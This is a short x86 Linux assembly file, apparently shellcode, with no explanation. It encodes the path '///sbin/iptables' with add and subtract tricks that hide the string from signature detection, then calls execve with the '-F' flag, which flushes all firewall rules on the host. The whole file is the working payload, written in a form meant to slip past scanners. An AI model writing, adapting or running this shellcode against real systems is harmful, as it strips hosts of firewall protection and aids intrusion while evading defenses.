section .text
	global _start

_start:

	xor eax,eax
	push eax
	push word 0x462d
	mov esi,esp
	push eax
	mov ebx, 0x61535A50
	add ebx, 0x12121212
	push ebx
	sub ebx, 0x11F0FBF9
	push ebx
	sub ebx, 0x32060707
	push ebx
	add ebx, 0x43c0c5cd
	push ebx
	mov ebx,esp
	push eax
	push esi
	push ebx
	mov ecx,esp
	mov edx,eax
	mov al,0xa
	inc al
	int 0x80
